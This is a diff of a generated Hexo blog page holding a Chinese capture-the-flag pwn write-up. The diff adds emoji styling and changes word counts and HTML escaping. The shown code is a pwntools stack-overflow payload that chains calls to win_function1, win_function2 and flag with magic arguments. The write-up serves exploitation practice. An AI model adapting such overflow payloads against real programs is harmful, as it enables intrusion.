@@ -53,7 +53,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1"></head>
+<meta name="generator" content="Hexo 5.4.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
 
 
 <body>
@@ -389,7 +391,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    253
+                    252
                 </div>
                 
 
@@ -441,7 +443,7 @@
 <p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
 <p>win_function2函数</p>
 <p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><pre class="line-numbers language-none"><code class="language-none">需要注意点就是，有个判断 条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 &#x3D;&#x3D; -559039827 )，需要控制win1、win2、a1
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><pre class="line-numbers language-none"><code class="language-none">需要注意点就是，有个判断 条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )，需要控制win1、win2、a1
 win1、win2可以通过调用对应的函数进行赋值，而a1是作为flag函数的参数，在栈上构造好数据即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>先对win1赋值，使win1=1</p>
@@ -459,7 +461,7 @@ flag <span class="token operator">=</span> <span class="token number">0x0804862B
 payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x1c</span>
 payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function1<span class="token punctuation">)</span>
 payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function2<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xBAAAAAAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xDEADBAAD</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input> "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input&gt; "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
 
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -881,7 +883,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">42.3k</span>
+                        class="white-color">41.6k</span>
             
             
             
